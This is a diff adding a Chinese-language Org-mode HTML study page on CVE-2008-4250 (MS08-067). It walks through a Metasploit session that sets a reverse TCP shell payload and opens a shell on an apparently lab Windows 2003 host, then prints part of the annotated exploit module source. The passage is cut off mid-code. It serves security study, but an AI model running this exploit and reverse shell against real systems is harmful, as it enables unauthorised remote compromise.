@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2022-08-24 Wed 23:58 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CVE-2008-4250</title>
+<meta name="author" content="Honbey Zhang" />
+<meta name="generator" content="Org Mode" />
+<style>
+  #content { max-width: 60em; margin: auto; }
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #e6e6e6;
+    border-radius: 3px;
+    background-color: #f2f2f2;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: auto;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    top: -8px;
+    right: 12px;
+    padding: 3px;
+    color: #555;
+    background-color: #f2f2f299;
+  }
+  pre.src:hover:before { display: inline; margin-top: 14px;}
+  /* Languages per Org manual */
+  pre.src-asymptote:before { content: 'Asymptote'; }
+  pre.src-awk:before { content: 'Awk'; }
+  pre.src-authinfo::before { content: 'Authinfo'; }
+  pre.src-C:before { content: 'C'; }
+  /* pre.src-C++ doesn't work in CSS */
+  pre.src-clojure:before { content: 'Clojure'; }
+  pre.src-css:before { content: 'CSS'; }
+  pre.src-D:before { content: 'D'; }
+  pre.src-ditaa:before { content: 'ditaa'; }
+  pre.src-dot:before { content: 'Graphviz'; }
+  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-fortran:before { content: 'Fortran'; }
+  pre.src-gnuplot:before { content: 'gnuplot'; }
+  pre.src-haskell:before { content: 'Haskell'; }
+  pre.src-hledger:before { content: 'hledger'; }
+  pre.src-java:before { content: 'Java'; }
+  pre.src-js:before { content: 'Javascript'; }
+  pre.src-latex:before { content: 'LaTeX'; }
+  pre.src-ledger:before { content: 'Ledger'; }
+  pre.src-lisp:before { content: 'Lisp'; }
+  pre.src-lilypond:before { content: 'Lilypond'; }
+  pre.src-lua:before { content: 'Lua'; }
+  pre.src-matlab:before { content: 'MATLAB'; }
+  pre.src-mscgen:before { content: 'Mscgen'; }
+  pre.src-ocaml:before { content: 'Objective Caml'; }
+  pre.src-octave:before { content: 'Octave'; }
+  pre.src-org:before { content: 'Org mode'; }
+  pre.src-oz:before { content: 'OZ'; }
+  pre.src-plantuml:before { content: 'Plantuml'; }
+  pre.src-processing:before { content: 'Processing.js'; }
+  pre.src-python:before { content: 'Python'; }
+  pre.src-R:before { content: 'R'; }
+  pre.src-ruby:before { content: 'Ruby'; }
+  pre.src-sass:before { content: 'Sass'; }
+  pre.src-scheme:before { content: 'Scheme'; }
+  pre.src-screen:before { content: 'Gnu Screen'; }
+  pre.src-sed:before { content: 'Sed'; }
+  pre.src-sh:before { content: 'shell'; }
+  pre.src-sql:before { content: 'SQL'; }
+  pre.src-sqlite:before { content: 'SQLite'; }
+  /* additional languages in org.el's org-babel-load-languages alist */
+  pre.src-forth:before { content: 'Forth'; }
+  pre.src-io:before { content: 'IO'; }
+  pre.src-J:before { content: 'J'; }
+  pre.src-makefile:before { content: 'Makefile'; }
+  pre.src-maxima:before { content: 'Maxima'; }
+  pre.src-perl:before { content: 'Perl'; }
+  pre.src-picolisp:before { content: 'Pico Lisp'; }
+  pre.src-scala:before { content: 'Scala'; }
+  pre.src-shell:before { content: 'Shell Script'; }
+  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
+  /* additional language identifiers per "defun org-babel-execute"
+       in ob-*.el */
+  pre.src-cpp:before  { content: 'C++'; }
+  pre.src-abc:before  { content: 'ABC'; }
+  pre.src-coq:before  { content: 'Coq'; }
+  pre.src-groovy:before  { content: 'Groovy'; }
+  /* additional language identifiers from org-babel-shell-names in
+     ob-shell.el: ob-shell is the only babel language using a lambda to put
+     the execution function name together. */
+  pre.src-bash:before  { content: 'bash'; }
+  pre.src-csh:before  { content: 'csh'; }
+  pre.src-ash:before  { content: 'ash'; }
+  pre.src-dash:before  { content: 'dash'; }
+  pre.src-ksh:before  { content: 'ksh'; }
+  pre.src-mksh:before  { content: 'mksh'; }
+  pre.src-posh:before  { content: 'posh'; }
+  /* Additional Emacs modes also supported by the LaTeX listings package */
+  pre.src-ada:before { content: 'Ada'; }
+  pre.src-asm:before { content: 'Assembler'; }
+  pre.src-caml:before { content: 'Caml'; }
+  pre.src-delphi:before { content: 'Delphi'; }
+  pre.src-html:before { content: 'HTML'; }
+  pre.src-idl:before { content: 'IDL'; }
+  pre.src-mercury:before { content: 'Mercury'; }
+  pre.src-metapost:before { content: 'MetaPost'; }
+  pre.src-modula-2:before { content: 'Modula-2'; }
+  pre.src-pascal:before { content: 'Pascal'; }
+  pre.src-ps:before { content: 'PostScript'; }
+  pre.src-prolog:before { content: 'Prolog'; }
+  pre.src-simula:before { content: 'Simula'; }
+  pre.src-tcl:before { content: 'tcl'; }
+  pre.src-tex:before { content: 'TeX'; }
+  pre.src-plain-tex:before { content: 'Plain TeX'; }
+  pre.src-verilog:before { content: 'Verilog'; }
+  pre.src-vhdl:before { content: 'VHDL'; }
+  pre.src-xml:before { content: 'XML'; }
+  pre.src-nxml:before { content: 'XML'; }
+  /* add a generic configuration mode; LaTeX export needs an additional
+     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
+  pre.src-conf:before { content: 'Configuration File'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .equation-container {
+    display: table;
+    text-align: center;
+    width: 100%;
+  }
+  .equation {
+    vertical-align: middle;
+  }
+  .equation-label {
+    display: table-cell;
+    text-align: right;
+    vertical-align: middle;
+  }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  .org-svg { }
+</style>
+<link rel="stylesheet"
+                    href="../resources/style.css"
+                    type="text/css"/>
+</head>
+<body>
+<div id="content" class="content">
+<header>
+<h1 class="title">CVE-2008-4250</h1>
+</header>
+<div id="outline-container-orga8d68f3" class="outline-2">
+<h2 id="orga8d68f3">Step</h2>
+<div class="outline-text-2" id="text-orga8d68f3">
+</div>
+<div id="outline-container-org417945d" class="outline-3">
+<h3 id="org417945d">搜索漏洞利用模块</h3>
+<div class="outline-text-3" id="text-org417945d">
+<div class="org-src-container">
+<pre class="src src-bash">msf &gt; search ms08_067
+
+Matching Modules
+================
+
+   Name                                 Disclosure Date  Rank   Description
+   ----                                 ---------------  ----   -----------
+   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Microsoft Server Service Relative Path Stack Corruption
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org874e6c2" class="outline-3">
+<h3 id="org874e6c2">选择载荷</h3>
+<div class="outline-text-3" id="text-org874e6c2">
+<div class="org-src-container">
+<pre class="src src-bash">msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; use exploit/windows/smb/ms08_067_netapi
+msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; show payloads
+
+Compatible Payloads
+===================
+
+   Name                                             Disclosure Date  Rank    Description
+   ----                                             ---------------  ----    -----------
+...SNIP...
+   generic/shell_reverse_tcp                                         normal  Generic Command Shell, Reverse TCP Inline
+...SNIP...
+msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; set payload generic/shell_reverse_tcp
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgbae52e4" class="outline-3">
+<h3 id="orgbae52e4">攻击载荷配置选项</h3>
+<div class="outline-text-3" id="text-orgbae52e4">
+<div class="org-src-container">
+<pre class="src src-bash">msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; show options
+
+Module options <span style="color: #707183;">(</span>exploit/windows/smb/ms08_067_netapi<span style="color: #707183;">)</span>:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    <span style="color: #D0372D;">445</span>              yes       Set the SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use <span style="color: #707183;">(</span>BROWSER, SRVSVC<span style="color: #707183;">)</span>
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span style="color: #D0372D;">0</span>   Automatic Targeting
+
+
+msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   <span style="color: #D0372D;">0</span>   Automatic Targeting
+...SNIP...
+   <span style="color: #D0372D;">5</span>   Windows <span style="color: #D0372D;">2003</span> SP0 Universal
+...SNIP...
+msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; set RHOST 10.10.10.130
+<span style="color: #BA36A5;">RHOST</span> =&gt; 10.10.10.130
+msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; set LPORT <span style="color: #D0372D;">5000</span>
+<span style="color: #BA36A5;">LPORT</span> =&gt; <span style="color: #D0372D;">5000</span>
+msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; set LHOST 10.10.10.128
+<span style="color: #BA36A5;">LHOST</span> =&gt; 10.10.10.128
+msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; set target <span style="color: #D0372D;">5</span>
+<span style="color: #BA36A5;">target</span> =&gt; <span style="color: #D0372D;">5</span>
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgfce426b" class="outline-3">
+<h3 id="orgfce426b">攻击</h3>
+<div class="outline-text-3" id="text-orgfce426b">
+<div class="org-src-container">
+<pre class="src src-bash">msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; exploit
+
+<span style="color: #707183;">[</span>*<span style="color: #707183;">]</span> Started reverse handler on 10.10.10.128:5000
+<span style="color: #707183;">[</span>*<span style="color: #707183;">]</span> Attempting to trigger the vulnerability...
+<span style="color: #707183;">[</span>*<span style="color: #707183;">]</span> Command shell session <span style="color: #D0372D;">2</span> opened <span style="color: #707183;">(</span>10.10.10.128:5000 -&gt; 10.10.10.130:2041<span style="color: #707183;">)</span> at 2020-09-06 08:36:57 -0400
+
+Microsoft Windows <span style="color: #707183;">[</span>Version 5.2.3790<span style="color: #707183;">]</span>
+<span style="color: #707183;">(</span>C<span style="color: #707183;">)</span> Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\system32&gt; <span style="color: #6434A3;">echo</span> <span style="color: #008000;">'Successfully!'</span>
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgdf57b91" class="outline-3">
+<h3 id="orgdf57b91">分析</h3>
+</div>
+
+<div id="outline-container-org27e977d" class="outline-3">
+<h3 id="org27e977d">攻击模块源码</h3>
+<div class="outline-text-3" id="text-org27e977d">
+<div class="org-src-container">
+<pre class="src src-ruby"><span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#27492;&#27169;&#22359;&#23558;&#21253;&#21547;Metasploit&#26680;&#24515;&#24211;&#30340;&#25152;&#26377;&#20989;&#25968;</span>
+<span style="color: #006FE0;">require</span> <span style="color: #008000;">'msf/core'</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#31867;&#23558;&#32487;&#25215;&#36828;&#31243;&#28183;&#36879;&#31867;&#30340;&#29305;&#24615;</span>
+<span style="color: #0000FF;">class</span> <span style="color: #6434A3;">Metasploit3</span> &lt; <span style="color: #6434A3;">Msf</span>::<span style="color: #6434A3;">Exploit</span>::<span style="color: #6434A3;">Remote</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#38750;&#24120;&#39640;&#30340;&#21033;&#29992;&#21487;&#33021;</span>
+    <span style="color: #6434A3;">Rank</span> = <span style="color: #6434A3;">GreatRanking</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#20174;&#26680;&#24515;&#24211;&#20013;&#23548;&#20837;DCERPC&#21644;SMB&#21033;&#29992;&#27169;&#22359;</span>
+    <span style="color: #006FE0;">include</span> <span style="color: #6434A3;">Msf</span>::<span style="color: #6434A3;">Exploit</span>::<span style="color: #6434A3;">Remote</span>::<span style="color: #6434A3;">DCERPC</span>
+    <span style="color: #006FE0;">include</span> <span style="color: #6434A3;">Msf</span>::<span style="color: #6434A3;">Exploit</span>::<span style="color: #6434A3;">Remote</span>::<span style="color: #6434A3;">SMB</span>
+
+    <span style="color: #0000FF;">def</span> <span style="color: #006699;">initialize</span>(info = {})
+        <span style="color: #0000FF;">super</span>(update_info(info,
+            <span style="color: #008000;">'Name'</span>           =&gt; <span style="color: #008000;">'Microsoft Server Service Relative Path Stack Corruption'</span>,
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#27169;&#22359;&#25551;&#36848;&#65292;&#22823;&#33268;&#20449;&#24687;&#65306;</span>
+<span style="color: #8D8D84;">#   </span><span style="color: #8D8D84; font-style: italic;">&#28431;&#27934;&#21457;&#29983;&#30340;&#20301;&#32622;&#20301;&#20110;Server&#26381;&#21153;&#35843;&#29992;&#30340;NetAPI32.dll&#20013;&#65292;&#36827;&#34892;path canonicalization(&#36335;&#24452;&#35268;&#33539;&#21270;)&#30340;&#20195;&#30721;&#12290;</span>
+<span style="color: #8D8D84;">#   </span><span style="color: #8D8D84; font-style: italic;">&#27492;&#27169;&#22359;&#21487;&#20197;&#32469;&#36807;&#19968;&#20123;&#29256;&#26412;&#30340;DEP&#65292;&#36873;&#25321;&#30340;&#30446;&#26631;&#19982;&#30495;&#23454;&#31995;&#32479;&#19981;&#21516;&#20250;&#36896;&#25104;Server&#26381;&#21153;&#30340;&#23849;&#28291;&#12290;</span>
+<span style="color: #8D8D84;">#   </span><span style="color: #8D8D84; font-style: italic;">&#24182;&#21457;&#25915;&#20987;&#19979;&#65292;XP&#21487;&#20197;&#25104;&#21151;&#28183;&#36879;&#65292;2003&#31995;&#32479;&#36890;&#24120;&#20250;&#23849;&#28291;&#25110;&#25346;&#36215;&#12290;</span>
+            <span style="color: #008000;">'Description'</span>    =&gt; <span style="color: #008000;">%q{</span>
+<span style="color: #008000;">                    This module exploits a parsing flaw in the path canonicalization code of</span>
+<span style="color: #008000;">                NetAPI32.dll through the Server Service. This module is capable of bypassing</span>
+<span style="color: #008000;">                NX on some operating systems and service packs. The correct target must be</span>
+<span style="color: #008000;">                used to prevent the Server Service (along with a dozen others in the same</span>
+<span style="color: #008000;">                process) from crashing. Windows XP targets seem to handle multiple successful</span>
+<span style="color: #008000;">                exploitation events, but 2003 targets will often crash or hang on subsequent</span>
+<span style="color: #008000;">                attempts. This is just the first version of this module, full support for</span>
+<span style="color: #008000;">                NX bypass on 2003, along with other platforms, is still in development.</span>
+<span style="color: #008000;">            }</span>,
+            <span style="color: #008000;">'Author'</span>         =&gt;
+                [
+                    <span style="color: #008000;">'hdm'</span>, <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">with tons of input/help/testing from the community</span>
+                    <span style="color: #008000;">'Brett Moore &lt;brett.moore[at]insomniasec.com&gt;'</span>,
+                    <span style="color: #008000;">'staylor'</span>, <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">check() detection</span>
+                ],
+            <span style="color: #008000;">'License'</span>        =&gt; <span style="color: #6434A3;">MSF_LICENSE</span>,
+            <span style="color: #008000;">'Version'</span>        =&gt; <span style="color: #008000;">'$Revision: 12540 $'</span>,
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#35813;&#28431;&#27934;&#22312;&#21508;&#20010;&#23433;&#20840;&#28431;&#27934;&#24211;&#20013;&#30340;&#21442;&#32771;&#21517;&#31216;&#12289;ID&#25110;URL</span>
+            <span style="color: #008000;">'References'</span>     =&gt;
+                [
+                    [ <span style="color: #008000;">'CVE'</span>, <span style="color: #008000;">'2008-4250'</span>],
+                    [ <span style="color: #008000;">'OSVDB'</span>, <span style="color: #008000;">'49243'</span>],
+                    [ <span style="color: #008000;">'MSB'</span>, <span style="color: #008000;">'MS08-067'</span> ],
+                    <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">If this vulnerability is found, ms08-67 is exposed as well</span>
+                    [ <span style="color: #008000;">'NEXPOSE'</span>, <span style="color: #008000;">'dcerpc-ms-netapi-netpathcanonicalize-dos'</span>]
+                ],
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#40664;&#35748;&#36873;&#39033;&#65292;&#27492;&#22788;&#35774;&#32622;&#20250;&#35805;&#25512;&#20986;&#26159;&#39044;&#35774;&#37319;&#29992;&#36864;&#20986;&#32447;&#31243;&#30340;&#26041;&#24335;</span>
+            <span style="color: #008000;">'DefaultOptions'</span> =&gt;
+                {
+                    <span style="color: #008000;">'EXITFUNC'</span> =&gt; <span style="color: #008000;">'thread'</span>,
+                },
+            <span style="color: #008000;">'Privileged'</span>     =&gt; <span style="color: #D0372D;">true</span>,
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Payload&#21021;&#22987;&#21270;&#21442;&#25968;&#65292;&#19968;&#33324;&#21253;&#25324;&#21487;&#29992;&#31354;&#38388;&#22823;&#23567;&#19982;&#22351;&#23383;&#31526;&#65292;&#27492;&#22788;&#36824;&#26377;&#20004;&#20010;&#20851;&#20110;&#35843;&#25972;&#26632;&#31354;&#38388;&#24067;&#23616;&#30340;&#36873;&#39033;</span>
+            <span style="color: #008000;">'Payload'</span>        =&gt;
+                {
+                    <span style="color: #008000;">'Space'</span>    =&gt; <span style="color: #D0372D;">400</span>,
+                    <span style="color: #008000;">'BadChars'</span> =&gt; <span style="color: #008000;">"\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"</span>,
+                    <span style="color: #008000;">'Prepend'</span>  =&gt; <span style="color: #008000;">"\x81\xE4\xF0\xFF\xFF\xFF"</span>, <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">stack alignment</span>
+                    <span style="color: #008000;">'StackAdjustment'</span> =&gt; -<span style="color: #D0372D;">3500</span>,
+
+                },
+            <span style="color: #008000;">'Platform'</span>       =&gt; <span style="color: #008000;">'win'</span>,
+            <span style="color: #008000;">'DefaultTarget'</span>  =&gt; <span style="color: #D0372D;">0</span>,
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#26681;&#25454;&#28183;&#36879;&#30446;&#26631;&#30340;&#19981;&#21516;&#26469;&#36827;&#34892;&#19981;&#21516;&#30340;&#21021;&#22987;&#21270;&#65292;&#27599;&#20010;&#25104;&#21592;&#23545;&#24212;&#20110;&#21487;&#20197;&#34987;&#35813;&#27169;&#22359;&#25915;&#20987;&#30340;&#25805;&#20316;&#31995;&#32479;&#24179;&#21488;</span>
+<span style="color: #8D8D84;">#   </span><span style="color: #8D8D84; font-style: italic;">&#25104;&#21592;&#30340;&#21508;&#20010;&#21464;&#37327;&#23545;&#20110;&#35813;&#31995;&#32479;&#19979;&#25104;&#21151;&#28183;&#36879;&#30340;&#20960;&#20010;&#20851;&#38190;&#37096;&#20998;&#65292;&#21253;&#25324;&#65306;</span>
+<span style="color: #8D8D84;">#       </span><span style="color: #8D8D84; font-style: italic;">&#36820;&#22238;&#22320;&#22336;&#22312;&#26632;&#30340;&#20301;&#32622;&#12289;&#32469;&#36807;NX&#38656;&#35201;&#30340;&#20195;&#30721;&#22359;&#22320;&#22336;&#31561;</span>
+            <span style="color: #008000;">'Targets'</span>        =&gt;
+                [
+                    <span style="color: #8D8D84;">#</span>
+                    <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Automatic targetting via fingerprinting</span>
+                    <span style="color: #8D8D84;">#</span>
+                    [ <span style="color: #008000;">'Automatic Targeting'</span>, { <span style="color: #008000;">'auto'</span> =&gt; <span style="color: #D0372D;">true</span> } ],
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">...SNIP...</span>
+                    <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Standard return-to-ESI without NX bypass</span>
+                    [ <span style="color: #008000;">'Windows 2003 SP0 Universal'</span>,
+                        {
+                            <span style="color: #008000;">'Ret'</span>       =&gt; 0x0100129e,
+                            <span style="color: #008000;">'Scratch'</span>   =&gt; 0x00020408,
+                        }
+                    ], <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">JMP ESI SVCHOST.EXE</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">...SNIP...</span>
+                ],
+
+            <span style="color: #008000;">'DisclosureDate'</span> =&gt; <span style="color: #008000;">'Oct 28 2008'</span>))
+
+        register_options(
+            [
+                <span style="color: #6434A3;">OptString</span>.new(<span style="color: #008000;">'SMBPIPE'</span>, [ <span style="color: #D0372D;">true</span>,  <span style="color: #008000;">"The pipe name to use (BROWSER, SRVSVC)"</span>, <span style="color: #008000;">'BROWSER'</span>]),
+            ], <span style="color: #0000FF;">self</span>.class)
+
+    <span style="color: #0000FF;">end</span>
+    <span style="color: #0000FF;">def</span> <span style="color: #006699;">exploit</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#39318;&#20808;&#24314;&#31435;TCP&#36830;&#25509;&#65292;&#28982;&#21518;&#36827;&#34892;SMB&#31354;&#20250;&#35805;&#36830;&#25509;&#65292;&#33509;&#21046;&#23450;&#20102;&#30446;&#26631;&#31995;&#32479;&#65292;&#21017;&#36171;&#20104;&#30456;&#20851;&#21464;&#37327;&#20197;&#30456;&#24212;&#30340;&#20540;</span>
+<span style="color: #8D8D84;">#   </span><span style="color: #8D8D84; font-style: italic;">&#33509;&#26159;&#33258;&#21160;&#33719;&#21462;&#65292;&#21017;&#23581;&#35797;&#20351;&#29992;SMB&#20250;&#35805;&#33719;&#21462;&#30446;&#26631;&#31995;&#32479;&#20449;&#24687;...</span>
+        connect()
+        smb_login()
+        <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Use a copy of the target</span>
+        mytarget = target
+        <span style="color: #0000FF;">if</span>(target[<span style="color: #008000;">'auto'</span>])
+            mytarget = <span style="color: #D0372D;">nil</span>
+            print_status(<span style="color: #008000;">"Automatically detecting the target..."</span>)
+            fprint = smb_fingerprint()
+            print_status(<span style="color: #008000;">"Fingerprint: </span><span style="color: #BA36A5;">#{fprint['os']}</span><span style="color: #008000;"> - </span><span style="color: #BA36A5;">#{fprint['sp']}</span><span style="color: #008000;"> - lang:</span><span style="color: #BA36A5;">#{fprint['lang']}</span><span style="color: #008000;">"</span>)
+            <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Bail early on unknown OS</span>
+            <span style="color: #0000FF;">if</span>(fprint[<span style="color: #008000;">'os'</span>] == <span style="color: #008000;">'Unknown'</span>)
+                <span style="color: #006FE0;">raise</span> <span style="color: #6434A3;">RuntimeError</span>, <span style="color: #008000;">"No matching target"</span>
+            <span style="color: #0000FF;">end</span>
+            <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Windows 2000 is mostly universal</span>
+            <span style="color: #0000FF;">if</span>(fprint[<span style="color: #008000;">'os'</span>] == <span style="color: #008000;">'Windows 2000'</span>)
+                mytarget = <span style="color: #0000FF;">self</span>.targets[<span style="color: #D0372D;">1</span>]
+            <span style="color: #0000FF;">end</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">...SNIP...</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#26500;&#24314;&#24694;&#24847;&#36335;&#24452;&#65292;&#20808;&#21021;&#22987;&#21270;&#19968;&#20123;&#21464;&#37327;&#65292;&#21253;&#25324;&#22635;&#20805;&#23383;&#31526;&#20018; pad &#65292;&#26381;&#21153;&#22120;&#21517;&#31216; server &#20197;&#21450;&#21069;&#32512; prefix &#65292;&#36335;&#24452; path&#12290;</span>
+<span style="color: #8D8D84;">#   </span><span style="color: #8D8D84; font-style: italic;">&#35843;&#29992;&#30340;&#24211;Rex (Ruby Extension Library) &#26159;Metasploit Framework&#20307;&#31995;&#32467;&#26500;&#30340;&#22522;&#30784;</span>
+        padder = [*(<span style="color: #008000;">"A"</span>..<span style="color: #008000;">"Z"</span>)]
+        pad = <span style="color: #008000;">"A"</span>
+        <span style="color: #0000FF;">while</span>(pad.length &lt; <span style="color: #D0372D;">7</span>)
+            c = padder[<span style="color: #006FE0;">rand</span>(padder.length)]
+            <span style="color: #0000FF;">next</span> <span style="color: #0000FF;">if</span> pad.index(c)
+            pad += c
+        <span style="color: #0000FF;">end</span>
+        prefix = <span style="color: #008000;">"\\"</span>
+        path   = <span style="color: #008000;">""</span>
+        server = <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Text</span>.rand_text_alpha(<span style="color: #006FE0;">rand</span>(<span style="color: #D0372D;">8</span>)+<span style="color: #D0372D;">1</span>).upcase
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#38024;&#23545;&#26576;&#19968;&#30446;&#26631;&#30340;&#25915;&#20987;&#20195;&#30721;</span>
+<span style="color: #8D8D84;">#   </span><span style="color: #8D8D84; font-style: italic;">&#30001;&#21069;&#25991;&#30693;&#65292;&#21464;&#37327;ret, scratch&#65292;ret&#23545;&#24212;SVCHOST.EXE&#31995;&#32479;&#25991;&#20214;&#20013;&#30340;JMP ESI&#25351;&#20196;&#22320;&#22336;</span>
+<span style="color: #8D8D84;">#   </span><span style="color: #8D8D84; font-style: italic;">&#25915;&#20987;&#27169;&#22359;&#26159;&#21033;&#29992;ESI&#23492;&#23384;&#22120;&#20013;&#25351;&#21521;&#26632;&#31354;&#38388;&#30340;&#22320;&#22336;&#65292;&#35206;&#30422;&#36820;&#22238;&#22320;&#22336;&#65292;&#36890;&#36807;JMP ESI&#25351;&#20196;&#36827;&#34892;&#36339;&#36716;&#65292;</span>
+<span style="color: #8D8D84;">#   </span><span style="color: #8D8D84; font-style: italic;">&#26368;&#32456;&#25191;&#34892;&#26632;&#20013;&#30340;Shellcode&#65292;&#26399;&#38388;&#21487;&#33021;&#38656;&#35201;&#20851;&#38381;NX</span>
+        <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Windows 2000, XP (NX), and 2003 (NO NX) mytargets</span>
+        <span style="color: #0000FF;">if</span>(<span style="color: #0000FF;">not</span> mytarget[<span style="color: #008000;">'RetDec'</span>])
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#26500;&#36896;&#20869;&#21547;&#36339;&#36716;&#22320;&#22336;&#30340;&#22635;&#20805;&#23383;&#31526;&#20018;jumper&#65292;&#21021;&#22987;&#21270;&#38271;&#24230;&#20026;70&#65292;&#20869;&#23481;&#20026;A-Z&#30340;&#38543;&#26426;&#23383;&#31526;</span>
+            jumper = <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Text</span>.rand_text_alpha(<span style="color: #D0372D;">70</span>).upcase
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#20174;&#31532;5&#23383;&#33410;&#36215;&#22635;&#20805;4&#23383;&#33410;&#30001;&#21021;&#22987;&#21270;ret&#23450;&#20041;&#30340;&#36820;&#22238;&#22320;&#22336;</span>
+            jumper[ <span style="color: #D0372D;">4</span>,<span style="color: #D0372D;">4</span>] = [mytarget.ret].pack(<span style="color: #008000;">"V"</span>)
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#20174;&#31532;51&#23383;&#33410;&#22635;&#20805;8&#23383;&#33410;&#30340;nop&#25351;&#20196;&#21644;2&#23383;&#33410;&#30340;&#36339;&#36716;&#25351;&#20196;"\xeb\x62"(jmp 0x62)</span>
+            jumper[<span style="color: #D0372D;">50</span>,<span style="color: #D0372D;">8</span>] = make_nops(<span style="color: #D0372D;">8</span>)
